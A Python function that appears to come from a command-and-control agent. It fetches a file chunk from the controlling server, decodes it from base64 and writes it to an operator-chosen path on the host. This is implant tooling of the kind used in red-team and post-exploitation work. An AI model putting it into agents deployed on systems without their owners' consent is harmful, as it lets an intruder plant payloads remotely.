def upload(task_id, file_id, remote_path):
    global responses
    remote_path = remote_path.replace("\\", "")

    upload = {
        'action': "upload",
        'file_id': file_id,
        'chunk_size': 512000,
        'chunk_num': 1,
        'full_path': "",
        'task_id': task_id,
    }

    res = send(upload, agent.get_UUID())

    res = res['chunk_data']

    response_bytes = res.encode('utf-8')
    response_decode = base64.b64decode(response_bytes)
    code = response_decode.decode('utf-8')

    f = open(remote_path, "w")
    f.write(code)
    f.close()

    response = {
            'task_id': task_id,
            "user_output": "File Uploaded",
            'completed': True
        }
    responses.append(response)

    print("\t- Upload Done")

    return